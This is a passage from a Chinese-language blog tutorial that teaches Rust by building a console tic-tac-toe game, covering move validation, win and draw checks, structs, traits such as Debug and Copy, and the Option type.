然后里面的入参 x 是一个&amp;str类型，这里通过parse()方法解析成usize类型（通过 <code>::&lt;&gt;</code> 的格式来指定），返回的也是Result（因为可能解析失败），然后unwrap解包。</p><p>  再通过collect方法把map返回的迭代器收集成一个Vec（是不定长的数组，所以创建时不用像数组一样标注长度）</p></blockquote><h3 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h3><p>接下来就要落子了，我们定义一个on_move，返回值是一个bool，来表示是否落子成功。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">on_move</span>(board: &amp;<span class="keyword">mut</span> [[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>], row: <span class="type">usize</span>, col: <span class="type">usize</span>, symbol: <span class="type">char</span>) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="comment">// symbol 是当前玩家对应的符号</span></span><br><span class="line">    <span class="comment">// 先检验范围，保证只能是0, 1, 2</span></span><br><span class="line">    <span class="comment">// 超出棋盘范围或者该处已经落子了，就代表这一步不成功</span></span><br><span class="line">    <span class="keyword">if</span> row &gt;= <span class="number">3</span> || col &gt;= <span class="number">3</span> || board[row][col] != <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">        <span class="literal">false</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        board[row][col] = symbol;</span><br><span class="line">        <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  这里得说明一下，每个作用域的最后一个表达式就会作为返回值，这里on_move函数只有一个表达式（最后一句不要有分号，有分号就是语句，语句没有返回值，或者准确来说语句返回一个单元<code>()</code> )，就是if {} else {}，然后if和else里面分别有false和true作为返回值。</p><p>  <strong>注意每个语句块只有最后一行才能不写分号，像是if， for，函数，或者仅仅只是{} 包裹的内容就是一个语句块。当然语句块也是一个语句</strong></p><p>  而return往往用于一个函数的中间，会直接跳出这个函数并返回值。</p><p>  这样的好处是不用写return（PS：本人比较倾向于不写return，一般不是迫不得已我不会写return）</p></blockquote><p>然后我们得处理一下on_move的结果</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> !<span class="title function_ invoke__">on_move</span>(&amp;<span class="keyword">mut</span> board, row, col, current_player) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Invalid move!&quot;</span>);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后每个人落子成功就轮到下一个玩家，我们写一个next_player来轮换玩家，你可能会想写个if，else if好了，不过这里我们用match来更优雅的实现</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> !<span class="title function_ invoke__">on_move</span>(...) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">        current_player = <span class="title function_ invoke__">next_player</span>(current_player);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">next_player</span>(symbol: <span class="type">char</span>) <span class="punctuation">-&gt;</span> <span class="type">char</span> &#123;</span><br><span class="line">    <span class="keyword">match</span> symbol &#123;</span><br><span class="line">        <span class="string">&#x27;X&#x27;</span> =&gt; <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;O&#x27;</span> =&gt; <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">        _ =&gt; <span class="built_in">unreachable!</span>(),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能跟C的switch很像，不过match的强大还远远不止这些，match有个大杀器就是模式匹配（没错，又是从函数式语言借鉴的：D），会在后续内容细嗦。</p><blockquote><p>  顺带一提，在Rust里面，<strong>无论是函数还是全局变量，或者是结构体等的定义，只要有定义就行了，不需要太关注位置，也就是说，你不必像C&#x2F;Cpp一样得先在main前面声明某个函数，才能在main后面写函数的具体实现。</strong></p></blockquote><h3 id="Win-or-Draw"><a href="#Win-or-Draw" class="headerlink" title="Win or Draw"></a>Win or Draw</h3><p>现在距离一个功能完备的游戏只差胜负判断了，我们得写一个is_win函数来再每次落子后判断是否有人胜利（win），然后还得写一个函数is_full来判断棋盘时候已经下满了，也就意味着平局（draw），当然这个函数得放在is_win后面调用：D， 最后在loop里面调用即可</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">is_win</span>(&amp;board) &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; win!&quot;</span>, current_player);</span><br><span class="line">            <span class="keyword">break</span>;<span class="comment">// 或者 return;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">is_full</span>(&amp;board) &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;Draw!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 保证上一步下完既没有人win，也没有下满棋盘，才能轮到下一手</span></span><br><span class="line">        current_player = <span class="title function_ invoke__">next_player</span>(current_player);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">is_win</span>(board: &amp;[[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>]) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="comment">// 行</span></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">row</span> <span class="keyword">in</span> board &#123;</span><br><span class="line">        <span class="keyword">if</span> row[<span class="number">0</span>] == row[<span class="number">1</span>] &amp;&amp; row[<span class="number">1</span>] == row[<span class="number">2</span>] &amp;&amp; row[<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 列</span></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">col</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">3</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> board[<span class="number">0</span>][col] == board[<span class="number">1</span>][col] &amp;&amp; board[<span class="number">1</span>][col] == board[<span class="number">2</span>][col] &amp;&amp; board[<span class="number">0</span>][col] != <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对角线</span></span><br><span class="line">    <span class="keyword">if</span> board[<span class="number">0</span>][<span class="number">0</span>] == board[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; board[<span class="number">1</span>][<span class="number">1</span>] == board[<span class="number">2</span>][<span class="number">2</span>] &amp;&amp; board[<span class="number">0</span>][<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> board[<span class="number">0</span>][<span class="number">2</span>] == board[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; board[<span class="number">1</span>][<span class="number">1</span>] == board[<span class="number">2</span>][<span class="number">0</span>] &amp;&amp; board[<span class="number">0</span>][<span class="number">2</span>] != <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">is_full</span>(board: &amp;[[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>]) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">row</span> <span class="keyword">in</span> board &#123;</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">col</span> <span class="keyword">in</span> row &#123;</span><br><span class="line">            <span class="keyword">if</span> *col == <span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ok，基本的功能已经基本实现了，可以运行玩一玩。这节内容其实没有涉及多少Rust真正深入的部分，上面遗留的很多问题<del>（挖的很多坑）</del>，会在下一节解答，下一节也会逐渐带你认识rust一些真正吸引人的特性。</p><h1 id="Improve-your-Rust-code"><a href="#Improve-your-Rust-code" class="headerlink" title="Improve your Rust code"></a>Improve your Rust code</h1><p>相信大佬们看了上面的很不尽兴吧，<del>我想要看Rust独特的特性（震声</del>，别急，本节会给出一个答复。</p><h2 id="使用struct封装"><a href="#使用struct封装" class="headerlink" title="使用struct封装"></a>使用struct封装</h2><p>我们可以定义一个Game结构体，来记录一些游戏属性。</p><p>在rust中，定义结构体和C是类似的：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    board: [<span class="type">char</span>; <span class="number">9</span>],</span><br><span class="line">    players: [<span class="type">char</span>; <span class="number">2</span>],</span><br><span class="line">    current_player: <span class="type">usize</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在原来的版本中，我们是使用X和O来代替玩家，但是这样太草率了，很多读者肯定不会买账的，所以这里我们定义一个Player结构体，储存名字和对应的符号</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;</span><br><span class="line">    name: <span class="type">String</span>,</span><br><span class="line">    symbol: <span class="type">char</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然前面的Game的players的类型也要做相应的修改。</p><p>那么我们怎么封装逻辑呢，这里我们是可以像其他语言的class一样为创建的结构体定义一组方法的。我们可以使用impl （implement）关键字为一个struct定义一组或多组实现</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> Game &#123;</span><br><span class="line">        Game &#123;</span><br><span class="line">            board: [<span class="string">&#x27; &#x27;</span>; <span class="number">9</span>],</span><br><span class="line">            players: [Player::<span class="title function_ invoke__">new</span>(); <span class="number">2</span>],</span><br><span class="line">            current_turn: <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Player</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> Player &#123;</span><br><span class="line">        Player &#123;</span><br><span class="line">            name: <span class="string">&quot;Test Player&quot;</span>.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            symbol: <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main里创建一个Game试试，</p><blockquote><p>  会发现爆了一个错误</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Compiling playground v0.<span class="number">0.1</span> (/playground)</span><br><span class="line">error[<span class="type">E0277</span>]: the trait bound `Player: <span class="built_in">Copy</span>` is not satisfied</span><br><span class="line">  <span class="literal">--</span>&gt; src/main.rs:<span class="number">21</span>:<span class="number">23</span></span><br><span class="line">   |</span><br><span class="line"><span class="number">21</span> |             players: [<span class="type">Player</span>::<span class="type">new</span>(); <span class="number">2</span>],</span><br><span class="line">   |                       ^^^^^^^^^^^^^ the trait `Copy` is not implemented <span class="keyword">for</span> `Player`</span><br><span class="line">   |</span><br><span class="line">   = note: the `Copy` trait is required because this value will be copied <span class="keyword">for</span> each element of the array</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> more information about this error, <span class="keyword">try</span> `rustc <span class="literal">--explain</span> E0277`.</span><br><span class="line">error: could not compile `playground` (bin <span class="string">&quot;playground&quot;</span>) due to previous error</span><br></pre></td></tr></table></figure><p>  这个在前面说过，是由于没有实现Copy特征，我们可以试试通过派生宏来快速实现一个特征</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Copy)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  发现还是报错了</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Compiling playground v0.<span class="number">0.1</span> (/playground)</span><br><span class="line">error[<span class="type">E0204</span>]: the trait `Copy` cannot be implemented <span class="keyword">for</span> this <span class="built_in">type</span></span><br><span class="line">  <span class="literal">--</span>&gt; src/main.rs:<span class="number">11</span>:<span class="number">10</span></span><br><span class="line">   |</span><br><span class="line"><span class="number">11</span> | <span class="comment">#[derive(Copy)]</span></span><br><span class="line">   |          ^^^^</span><br><span class="line"><span class="number">12</span> | struct Player &#123;</span><br><span class="line"><span class="number">13</span> |     name: String,</span><br><span class="line">   |     <span class="literal">------------</span> this field does not implement `Copy`</span><br><span class="line">   |</span><br><span class="line">   = note: this error originates <span class="keyword">in</span> the derive macro `Copy` (<span class="keyword">in</span> Nightly builds, run with <span class="literal">-Z</span> macro<span class="literal">-backtrace</span> <span class="keyword">for</span> more info)</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> more information about this error, <span class="keyword">try</span> `rustc <span class="literal">--explain</span> E0204`.</span><br><span class="line">error: could not compile `playground` (bin <span class="string">&quot;playground&quot;</span>) due to previous error</span><br></pre></td></tr></table></figure><p>  由于Player里面包含了String，所以不能为Player实现Copy特征，这是因为数据在堆上，不能快速拷贝，所以无法实现Copy，这也意味着我们不能用这个[xxx; n] 的格式来快速生成了，其实这是一个语法糖，当数据长度比较大，用这个就很方便，当然我们只能采用最普通的方法： <code>[Player::new(), Player::new()]</code>， 就是有几个就写几遍，或者也可以创建一个空的Vec后面在push两个Player进去。</p></blockquote><p>改好后我们可以输出一下Game的信息看看。</p><p>如果你习惯写C，可能会想要依次访问每个成员，再输出，在rust里当然可以，不过更加优雅的方式是为该结构体实现一个Debug特征</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面的#[derive()]是一个派生宏，可以快速实现某些特征，当然如果想要自定义效果，你也可以自己手动实现该特征。通过派生宏来实现的一个条件是必须每个成员都实现了该特征，因为Game里面有成员的类型包含了Player，所以我们得给Player也实现Debug，由于Player里面的String和char是默认实现了该特征，所以Player才能实现Debug，像前面Copy特征正是由于String在堆上，不能实现Copy，导致Player也不能实现Copy特征。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">game</span> = Game::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, &amp;game);</span><br><span class="line">    <span class="comment">// 或者选择更好的输出方式</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:#?&#125;&quot;</span>, &amp;game);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Game &#123; board: [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>], players: [<span class="type">Player</span> &#123; <span class="type">name</span>: <span class="string">&quot;Test Player&quot;</span>, <span class="type">symbol</span>: <span class="string">&#x27;X&#x27;</span> &#125;, <span class="type">Player</span> &#123; <span class="type">name</span>: <span class="string">&quot;Test Player&quot;</span>, <span class="type">symbol</span>: <span class="string">&#x27;X&#x27;</span> &#125;], current_player: <span class="number">0</span> &#125;</span><br><span class="line">Game &#123;</span><br><span class="line">    board: [</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    players: [</span><br><span class="line">        <span class="type">Player</span> &#123;</span><br><span class="line">            <span class="type">name</span>: <span class="string">&quot;Test Player&quot;</span>,</span><br><span class="line">            <span class="type">symbol</span>: <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="type">Player</span> &#123;</span><br><span class="line">            <span class="type">name</span>: <span class="string">&quot;Test Player&quot;</span>,</span><br><span class="line">            <span class="type">symbol</span>: <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    ],</span><br><span class="line">    current_player: <span class="number">0</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体选择哪种取决你自己实际需求，如果都不合你胃口，就可以自己实现一个Debug特征</p><h2 id="自定义Debug样式"><a href="#自定义Debug样式" class="headerlink" title="自定义Debug样式"></a>自定义Debug样式</h2><p>如果学过面向对象，那么肯定知道继承这个概念，但是一上手可能很容易写出屎山，而且不好维护（如果你对某个基类做了修改的话），而Rust选择抛弃了继承这一个糟糕的特性，选择另一种更加优雅的方式来实现类的多态，也就是trait。</p><p>Trait（特征）是为一些类定义的一组行为，如果要一个struct使用某个特征的功能，只要为它实现该特征即可，一个struct可以实现多个特征。来看看例子，我们来为Player和Game实现自定义的Debug</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt::&#123;<span class="built_in">Debug</span>, Formatter, <span class="type">Result</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Debug</span> <span class="keyword">for</span> <span class="title class_">Player</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> Formatter&lt;<span class="symbol">&#x27;_</span>&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span> &#123;</span><br><span class="line">        <span class="built_in">write!</span>(f, <span class="string">&quot;Player &#123;&#125; with &#123;&#125;&quot;</span>, &amp;<span class="keyword">self</span>.name, &amp;<span class="keyword">self</span>.symbol)</span><br><span class="line">        <span class="comment">// 注意不要带分号，因为要返回Result，带分号就返回()了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Debug</span> <span class="keyword">for</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> Formatter&lt;<span class="symbol">&#x27;_</span>&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span> &#123;</span><br><span class="line">        f.<span class="title function_ invoke__">debug_struct</span>(<span class="string">&quot;Game&quot;</span>)</span><br><span class="line">            .<span class="title function_ invoke__">field</span>(<span class="string">&quot;board&quot;</span>, &amp;<span class="built_in">format!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, &amp;<span class="keyword">self</span>.board) <span class="keyword">as</span> &amp;<span class="keyword">dyn</span> <span class="built_in">Debug</span>)</span><br><span class="line">            .<span class="title function_ invoke__">field</span>(<span class="string">&quot;players&quot;</span>, &amp;<span class="keyword">self</span>.players)</span><br><span class="line">            .<span class="title function_ invoke__">field</span>(<span class="string">&quot;current_player&quot;</span>, &amp;<span class="keyword">self</span>.current_player)</span><br><span class="line">            .<span class="title function_ invoke__">finish</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再运行看看就发先变成自定义的了，记得去掉<code>#[derive(Debug)]</code>，否则会提示你实现Debug特征冲突了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Game &#123; board: <span class="string">&quot;[&#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;]&quot;</span>, players: [<span class="type">Player</span> <span class="type">Test</span> <span class="type">Player</span> <span class="type">with</span> <span class="type">X</span>, <span class="type">Player</span> <span class="type">Test</span> <span class="type">Player</span> <span class="type">with</span> <span class="type">X</span>], current_player: <span class="number">0</span> &#125;</span><br><span class="line">Game &#123;</span><br><span class="line">    board: <span class="string">&quot;[&#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;]&quot;</span>,</span><br><span class="line">    players: [</span><br><span class="line">        <span class="type">Player</span> <span class="type">Test</span> <span class="type">Player</span> <span class="type">with</span> <span class="type">X</span>,</span><br><span class="line">        <span class="type">Player</span> <span class="type">Test</span> <span class="type">Player</span> <span class="type">with</span> <span class="type">X</span>,</span><br><span class="line">    ],</span><br><span class="line">    current_player: <span class="number">0</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用Option"><a href="#使用Option" class="headerlink" title="使用Option"></a>使用Option</h2><p>我们不妨把函数迁移到我们定义的struct吧，但这里其实会发现：我们很多函数都是直接对与board的操作，那么这里我们如果直接为Game实现这些功能，就会发现非常的丑陋，尤其是is_win，is_full这些只用到了board的函数。那么我们为什么不定义一个Board，而把这部分逻辑封装到board里面呢？</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Board</span> &#123;</span><br><span class="line">    cells: [....]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次我们就不按照之前的使用char数组了，我们使用char数组时是用空格作为初始值的，但是这样其实并不好<del>（如果我想用空格作为玩家的符号呢）</del>。在这种情况下，Option是一个很好的解决办法！Option和Result的定义很像</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Option</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="title function_ invoke__">Some</span>(T),</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很好理解吧，要么有值（Some），要么是空（None）。这样设计的好处就是避免了像C一样0和NULL冲突。你只需要吧None作为一个仅代表空这个意义的东西。</p><p>那么我们来改写一下board</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 